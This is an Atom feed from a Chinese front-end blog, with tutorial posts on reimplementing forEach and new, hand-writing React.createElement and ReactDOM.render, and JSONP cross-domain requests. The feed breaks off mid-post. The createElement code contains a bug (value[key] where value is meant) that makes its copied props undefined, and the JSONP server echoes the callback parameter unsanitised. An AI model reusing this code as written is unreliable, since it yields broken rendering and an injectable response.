<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>奇幻的梦之旅</title>
  
  <subtitle>http://llmysnow.top/</subtitle>
  <link href="http://llmysnow.top/atom.xml" rel="self"/>
  
  <link href="http://llmysnow.top/"/>
  <updated>2021-08-31T02:20:06.549Z</updated>
  <id>http://llmysnow.top/</id>
  
  <author>
    <name>LiLyn</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>重写各大方法</title>
    <link href="http://llmysnow.top/posts/e8c036a5/"/>
    <id>http://llmysnow.top/posts/e8c036a5/</id>
    <published>2021-08-31T02:16:08.895Z</published>
    <updated>2021-08-31T02:20:06.549Z</updated>
    
    <content type="html"><![CDATA[<h2 id="重写-forEach-方法（支持对象遍历）"><a href="#重写-forEach-方法（支持对象遍历）" class="headerlink" title="重写 forEach 方法（支持对象遍历）"></a>重写 forEach 方法（支持对象遍历）</h2><p>需要考虑的点：</p><ul><li>Symbol 无法用 <code>for...in...</code> 遍历的，可以使用 <code>Object.getOwnPropertySymbols()</code> 获取，之后结合 for 循环或 <code>Object.keys()</code> 使用即可</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">each</span>(<span class="params">obj, callback</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> keys = <span class="built_in">Object</span>.keys(obj),</span><br><span class="line">    key = <span class="literal">null</span>,</span><br><span class="line">    value = <span class="literal">null</span>,</span><br><span class="line">    i = <span class="number">0</span>,</span><br><span class="line">    len = <span class="number">0</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="built_in">Symbol</span> !== <span class="string">&#x27;undefined&#x27;</span>) &#123;</span><br><span class="line">    <span class="comment">// 支持Symbol</span></span><br><span class="line">    keys = keys.concat(<span class="built_in">Object</span>.getOwnPropertySymbols(obj))</span><br><span class="line">  &#125;</span><br><span class="line">  len = keys.length</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> callback !== <span class="string">&#x27;function&#x27;</span>) callback = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line">  <span class="keyword">for</span> (; i &lt; len; i++) &#123;</span><br><span class="line">    key = keys[i]</span><br><span class="line">    value = obj[key]</span><br><span class="line">    callback(value, key)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="重写-new"><a href="#重写-new" class="headerlink" title="重写 new"></a>重写 new</h2><p>new 步骤：</p><ol><li><p>创建Ctor的一个实例对象</p><p><code>实例.__proto__ = Ctor.prototype</code></p></li><li><p>把构造函数当做普通函数执行（让方法中的this-&gt;实例对象）</p></li><li><p>确认方法的返回值（如果没有返回值或者返回的是原始值，我们让其默认返回实例对象即可）</p></li></ol><p>需要考虑的点：</p><ul><li><p>Symbol、BigInt 不能被 new</p></li><li><p>箭头函数不能被 new</p><p><a href="https://blog.csdn.net/weixin_42798473/article/details/105319353">https://blog.csdn.net/weixin_42798473/article/details/105319353</a></p></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Ctor -&gt; constructor缩写（构造函数）</span></span><br><span class="line"><span class="comment">params -&gt; 后期给Ctor传递的所有实参信息</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_new</span>(<span class="params">Ctor, ...params</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> obj,</span><br><span class="line">    result,</span><br><span class="line">    proto = Ctor.prototype</span><br><span class="line">  <span class="comment">// 校验规则</span></span><br><span class="line">  <span class="keyword">if</span> (Ctor === <span class="built_in">Symbol</span> || Ctor === BigInt || <span class="keyword">typeof</span> Ctor !== <span class="string">&#x27;function&#x27;</span> || !proto)</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">TypeError</span>(<span class="string">`<span class="subst">$&#123;Ctor&#125;</span> is not a constructor`</span>)</span><br><span class="line">  obj = <span class="built_in">Object</span>.create(Ctor.prototype)</span><br><span class="line">  result = Ctor.call(obj, ...params)</span><br><span class="line">  <span class="keyword">if</span> (<span class="regexp">/^(object|function)$/</span>.test(<span class="keyword">typeof</span> result)) <span class="keyword">return</span> result</span><br><span class="line">  <span class="keyword">return</span> obj</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;重写-forEach-方法（支持对象遍历）&quot;&gt;&lt;a href=&quot;#重写-forEach-方法（支持对象遍历）&quot; class=&quot;headerlink&quot; title=&quot;重写 forEach 方法（支持对象遍历）&quot;&gt;&lt;/a&gt;重写 forEach 方法（支持对象遍历）&lt;/</summary>
      
    
    
    
    <category term="JavaScript" scheme="http://llmysnow.top/categories/JavaScript/"/>
    
    
    <category term="new" scheme="http://llmysnow.top/tags/new/"/>
    
    <category term="方法重写" scheme="http://llmysnow.top/tags/%E6%96%B9%E6%B3%95%E9%87%8D%E5%86%99/"/>
    
  </entry>
  
  <entry>
    <title>手撕React.createElement和ReactDOM.render</title>
    <link href="http://llmysnow.top/posts/7e319c36/"/>
    <id>http://llmysnow.top/posts/7e319c36/</id>
    <published>2021-08-31T02:16:08.894Z</published>
    <updated>2021-08-31T02:16:08.894Z</updated>
    
    <content type="html"><![CDATA[<h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">npm install create-react-app -g</span><br><span class="line">create-react-app demo</span><br><span class="line"><span class="built_in">cd</span> demo</span><br><span class="line">yarn start</span><br></pre></td></tr></table></figure><a id="more"></a><ul><li>这时已经新建好了一个 react 项目，接下来 index.js 写入如下代码</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">console.log(</span><br><span class="line">  <span class="tag">&lt;<span class="name">h1</span> <span class="attr">id</span>=<span class="string">&quot;h1&quot;</span> <span class="attr">className</span>=<span class="string">&quot;title&quot;</span> <span class="attr">key</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">    hello world</span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span> <span class="attr">style</span>=<span class="string">&#123;&#123;</span> <span class="attr">color:</span> &#x27;<span class="attr">red</span>&#x27; &#125;&#125;&gt;</span>cat<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><ul><li>如下对象就是一个 React 对象，也就是虚拟 DOM</li></ul><p><img data-src="https://img-blog.csdnimg.cn/img_convert/723b629d0e10b5bd476871bed912c40b.png" alt="虚拟dom对象示例"></p><ul><li>接下来我们打开<a href="https://www.babeljs.cn/repl">babel 官网</a>，勾选 <code>react</code> ，粘贴上去。通过 babel 把 jsx 对象转换成 React 中的 createElement 函数</li></ul><p><img data-src="https://img-blog.csdnimg.cn/img_convert/c9c1436f832951ebbe63cb587d77585f.png" alt="babel_react"></p><ul><li>在项目中写入如下代码</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> React <span class="keyword">from</span> <span class="string">&#x27;react&#x27;</span></span><br><span class="line"><span class="keyword">import</span> ReactDOM <span class="keyword">from</span> <span class="string">&#x27;react-dom&#x27;</span></span><br><span class="line"></span><br><span class="line">ReactDOM.render(</span><br><span class="line">  &lt;h1 id=<span class="string">&quot;h1&quot;</span> className=<span class="string">&quot;title&quot;</span> key=<span class="string">&quot;1&quot;</span>&gt;</span><br><span class="line">    hello world</span><br><span class="line">    &lt;span style=&#123;&#123; <span class="attr">color</span>: <span class="string">&#x27;red&#x27;</span> &#125;&#125;&gt;cat&lt;/span&gt;</span><br><span class="line">  &lt;/h1&gt;,</span><br><span class="line">  <span class="built_in">document</span>.getElementById(<span class="string">&#x27;root&#x27;</span>)</span><br><span class="line">)</span><br></pre></td></tr></table></figure><ul><li>效果图如下：</li></ul><p><img data-src="https://img-blog.csdnimg.cn/img_convert/1e643e0830b8155a555ee3261eed6a4a.png" alt="渲染示例"></p><p><strong>过程：</strong></p><ol><li>通过 babel（babel-preset-react-app）转换成 jsx 对象</li><li>默认会把 createElement 函数执行，得到 JSX 对象（虚拟 DOM 对象）<ul><li>第一个参数：type，后期要创建元素的标签名（或是组件）</li><li>第二个参数：props，属性对象，包含当前元素标签上设置的各个属性及属性值（不设置，props 值是 null）</li><li>第三个以后的参数：children，当前元素的所有子节点（没有写，则不存在这个参数），如果有，有几个就依次传递几个<ul><li>如果是文本节点，则直接传递文本内容</li><li>如果是元素节点，则把元素依次变为 createElement 格式，把执行的返回值，作为参数传递进来</li></ul></li></ul></li><li>ReactDOM.render，把虚拟 DOM 对象转换为真实 DOM 对象</li></ol><h2 id="React-中-createElement-函数"><a href="#React-中-createElement-函数" class="headerlink" title="React 中 createElement 函数"></a>React 中 createElement 函数</h2><p><strong>React.createElement 返回值</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  $$typeof: <span class="built_in">Symbol</span>(react.element),</span><br><span class="line">  key: <span class="literal">null</span>,</span><br><span class="line">  ref: <span class="literal">null</span>,</span><br><span class="line">  <span class="comment">// 存储的是传递给createElement的第一个参数</span></span><br><span class="line">  type: <span class="string">&#x27;h1&#x27;</span>,</span><br><span class="line">  <span class="comment">// 首先会把传递给createElement的属性对象，一项项的赋值给对象的props</span></span><br><span class="line">  props: &#123;</span><br><span class="line">    <span class="comment">// 并且返回对象的prop还包含children，记录当前元素的子节点（可能是一个值&#123;字符串或JSX返回的对象&#125;，如果有多个子节点，则其是一个数组）</span></span><br><span class="line">    children: <span class="string">&#x27;hello world&#x27;</span>,</span><br><span class="line">    className: <span class="string">&#x27;title&#x27;</span>,</span><br><span class="line">    id: <span class="string">&#x27;title&#x27;</span>,</span><br><span class="line">  &#125;, <span class="comment">// 即使没有传递任何属性，也没有任何的子节点，返回对象的props也是一个&#123;&#125;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>这里需要注意，key 和 ref 虽然都在 props 里，但是这两个不在 props 里添加，而与 props 同级</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">React.createElement = <span class="function"><span class="keyword">function</span> <span class="title">createElement</span>(<span class="params">type, props, ...children</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> len = children.length,</span><br><span class="line">    obj = &#123;</span><br><span class="line">      type,</span><br><span class="line">      props: &#123;&#125;,</span><br><span class="line">      key: <span class="literal">null</span>,</span><br><span class="line">      ref: <span class="literal">null</span>,</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">// 处理传递进来的属性</span></span><br><span class="line">  <span class="keyword">if</span> (props !== <span class="literal">null</span> &amp;&amp; <span class="keyword">typeof</span> props === <span class="string">&#x27;object&#x27;</span>) &#123;</span><br><span class="line">    each(props, <span class="function">(<span class="params">value, key</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="regexp">/^(key|ref)$/</span>.test(key)) &#123;</span><br><span class="line">        obj[key] = value[key]</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">      &#125;</span><br><span class="line">      obj.props[key] = value[key]</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="comment">// for in 循环性能较差</span></span><br><span class="line">    <span class="comment">/* for (let key in props) &#123;</span></span><br><span class="line"><span class="comment">      if (!props.hasOwnProperty(key)) break</span></span><br><span class="line"><span class="comment">      if (/^(key|ref)$/.test(key)) &#123;</span></span><br><span class="line"><span class="comment">        obj[key] = props[key]</span></span><br><span class="line"><span class="comment">        continue</span></span><br><span class="line"><span class="comment">      &#125;</span></span><br><span class="line"><span class="comment">      obj.props[key] = props[key]</span></span><br><span class="line"><span class="comment">    &#125; */</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 处理子节点</span></span><br><span class="line">  <span class="keyword">if</span> (len &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    obj.props.children = len === <span class="number">1</span> ? children[<span class="number">0</span>] : children</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> obj</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>由于 <code>for...in...</code> 循环性能较差，这里稍微优化一下（封装一个 each 方法）</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> each = <span class="function"><span class="keyword">function</span> <span class="title">each</span>(<span class="params">obj, callback</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (obj == <span class="literal">null</span> || <span class="keyword">typeof</span> obj !== <span class="string">&#x27;object&#x27;</span>)</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">TypeError</span>(<span class="string">&#x27;obj must be an object&#x27;</span>)</span><br><span class="line">  <span class="keyword">let</span> keys = <span class="built_in">Object</span>.keys(obj),</span><br><span class="line">    key,</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="built_in">Symbol</span> !== <span class="string">&#x27;undefined&#x27;</span>) &#123;</span><br><span class="line">    keys = keys.concat(<span class="built_in">Object</span>.getOwnPropertySymbols(obj))</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (; i &lt; keys.length; i++) &#123;</span><br><span class="line">    key = keys[i]</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> callback === <span class="string">&#x27;function&#x27;</span>) &#123;</span><br><span class="line">      callback(obj[key], key)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ReactDOM-中-render-函数"><a href="#ReactDOM-中-render-函数" class="headerlink" title="ReactDOM 中 render 函数"></a>ReactDOM 中 render 函数</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">ReactDOM.render = <span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params">obj, container, callback</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> &#123; type, props &#125; = obj,</span><br><span class="line">    element</span><br><span class="line">  <span class="comment">// 核心思想：动态创建指定类型的元素，插入到指定容器当中</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> type === <span class="string">&#x27;string&#x27;</span>) &#123;</span><br><span class="line">    element = <span class="built_in">document</span>.createElement(type)</span><br><span class="line">    each(props, <span class="function">(<span class="params">value, key</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (key === <span class="string">&#x27;className&#x27;</span>) &#123;</span><br><span class="line">        element.setAttribute(<span class="string">&#x27;class&#x27;</span>, value)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (key === <span class="string">&#x27;style&#x27;</span>) &#123;</span><br><span class="line">        <span class="comment">// 把style对象中的每一项分别给元素设置样式 value:style对象</span></span><br><span class="line">        each(value, <span class="function">(<span class="params">item, attr</span>) =&gt;</span> &#123;</span><br><span class="line">          element.style[attr] = item</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (key === <span class="string">&#x27;children&#x27;</span>) &#123;</span><br><span class="line">        <span class="comment">// 肯定有子节点 value:children属性值</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">Array</span>.isArray(value)) value = [value] <span class="comment">// 让它都是数组</span></span><br><span class="line">        value.forEach(<span class="function">(<span class="params">item, index</span>) =&gt;</span> &#123;</span><br><span class="line">          <span class="comment">// item每个子节点</span></span><br><span class="line">          <span class="comment">// 1.文本子节点：直接创建一个文本节点，插入到element中</span></span><br><span class="line">          <span class="comment">// 2.元素子节点：新的jsx对象（createElement），我们需要把它也创建成为一个元素标签，插入到element中即可</span></span><br><span class="line">          <span class="keyword">if</span> (<span class="keyword">typeof</span> item === <span class="string">&#x27;string&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">let</span> textNode = <span class="built_in">document</span>.createTextNode(item)</span><br><span class="line">            element.appendChild(textNode)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">          &#125;</span><br><span class="line">          <span class="comment">// 递归处理</span></span><br><span class="line">          render(item, element)</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">      &#125;</span><br><span class="line">      element.setAttribute(key, value)</span><br><span class="line">    &#125;)</span><br><span class="line">    container.appendChild(element)</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> callback === <span class="string">&#x27;function&#x27;</span>) &#123;</span><br><span class="line">      callback()</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 如果type是一个组件，有不同的处理方案</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;准备工作&quot;&gt;&lt;a href=&quot;#准备工作&quot; class=&quot;headerlink&quot; title=&quot;准备工作&quot;&gt;&lt;/a&gt;准备工作&lt;/h2&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;npm install create-react-app -g&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;create-react-app demo&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;cd&lt;/span&gt; demo&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;yarn start&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="React" scheme="http://llmysnow.top/categories/React/"/>
    
    
    <category term="源码分析" scheme="http://llmysnow.top/tags/%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"/>
    
    <category term="React" scheme="http://llmysnow.top/tags/React/"/>
    
    <category term="createElement" scheme="http://llmysnow.top/tags/createElement/"/>
    
    <category term="render" scheme="http://llmysnow.top/tags/render/"/>
    
  </entry>
  
  <entry>
    <title>跨域常见的几种解决方案</title>
    <link href="http://llmysnow.top/posts/519525d/"/>
    <id>http://llmysnow.top/posts/519525d/</id>
    <published>2021-08-31T02:16:08.894Z</published>
    <updated>2021-08-31T02:16:08.895Z</updated>
    
    <content type="html"><![CDATA[<h2 id="跨域"><a href="#跨域" class="headerlink" title="跨域"></a>跨域</h2><p><strong>非同源策略请求</strong>（比较协议、域名、端口号，只要有一个不一样就是跨域）：</p><ol><li>页面的访问地址（Web地址）</li><li>数据接口的请求地址</li></ol><a id="more"></a><p>情况1：开发时候是跨域的，但是服务器部署的时候是同源的</p><ul><li><p>修改本地 HOST【DNS解析】</p><p>核心：骗过浏览器，让浏览器认为是同源，但是本质还是跨域</p></li></ul><p>情况2：开发和上线都是跨域的</p><ul><li><p>JSONP（不安全，并且只支持GET请求）</p></li><li><p>其它方案</p><p><code>document.domain + iframe</code></p><p><code>window.name + iframe</code></p><p><code>H5 postMessage</code></p></li><li><p>CORS 跨域资源共享</p></li><li><p>proxy 跨域代理（目前最常用的）</p></li></ul><h2 id="JSONP-跨域资源请求"><a href="#JSONP-跨域资源请求" class="headerlink" title="JSONP 跨域资源请求"></a>JSONP 跨域资源请求</h2><p>利用<code>&lt;script&gt;</code> 或者<code>&lt;link&gt; &lt;img&gt; &lt;iframe&gt;...</code> 不存在域的限制</p><ul><li>特征：资源访问一定都是GET请求，不可能有POST</li></ul><p>全局函数 <code>function fn(result) &#123; ... &#125;</code></p><ol><li><code>&lt;script src=&#39;http://127.0.0.1:8888/user/list?callback=fn&#39;&gt;</code> 一定能发送到服务器（不存在域的限制），把全局函数 fn 名字，当做参数传递给服务器</li><li>服务器接收到这个请求，同时也可以获取 callback 传递的值（fn）</li><li>准备数据，最后返回给客户端 <code>fn([10,20,30])</code></li><li>客户端把函数 fn 执行，把服务器准备的数据作为实参传递给函数的形参</li></ol><h3 id="服务器代码"><a href="#服务器代码" class="headerlink" title="服务器代码"></a>服务器代码</h3><ul><li>首先看一下服务器代码，这里提供了 <code>jsonpTest</code> 这个资源路径，并返回给客户端 一个字符串（包含执行函数和参数）</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> app = express()</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> port = <span class="number">1001</span></span><br><span class="line">app.listen(port, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">`The Web Service Is Listening To The Port: <span class="subst">$&#123;port&#125;</span>`</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&#x27;/jsonpTest&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> fname = req.query.callback</span><br><span class="line">  <span class="keyword">let</span> data = [<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>]</span><br><span class="line">  res.send(<span class="string">`<span class="subst">$&#123;fname&#125;</span>(<span class="subst">$&#123;<span class="built_in">JSON</span>.stringify(data)&#125;</span>)`</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="JSONP-简单案例"><a href="#JSONP-简单案例" class="headerlink" title="JSONP 简单案例"></a>JSONP 简单案例</h3><ul><li>现在来尝试一下 jsonp 的一个简单案例</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">  <span class="function"><span class="keyword">function</span> <span class="title">func</span>(<span class="params">result</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(result)</span></span><br><span class="line">  &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://127.0.0.1:1001/jsonpTest?callback=func&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="封装-JSONP"><a href="#封装-JSONP" class="headerlink" title="封装 JSONP"></a>封装 JSONP</h3><ul><li>每次像简单案例那样调用太过麻烦，现在我们想像 Axios 那样调用 jsonp</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;node_modules/qs/dist/qs.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;1.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line">  jsonp(&#123;</span><br><span class="line"><span class="javascript">    url: <span class="string">&#x27;https://www.baidu.com/sugrec&#x27;</span>,</span></span><br><span class="line">    params: &#123;</span><br><span class="line">      prod: 0,</span><br><span class="line"><span class="javascript">      <span class="keyword">from</span>: <span class="string">&#x27;qq&#x27;</span>,</span></span><br><span class="line">    &#125;,</span><br><span class="line"><span class="javascript">    jsonpName: <span class="string">&#x27;callback&#x27;</span>,</span></span><br><span class="line"><span class="javascript">    success: <span class="function"><span class="params">result</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">      <span class="built_in">console</span>.log(result)</span></span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><p>实现代码如下：</p><p>当前还可以实现 Promise 版本，这里就不再实现了</p><p>可以参考：<a href="https://juejin.cn/post/6844904161985708046">面试中如何实现一个高质量的JSONP</a></p></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 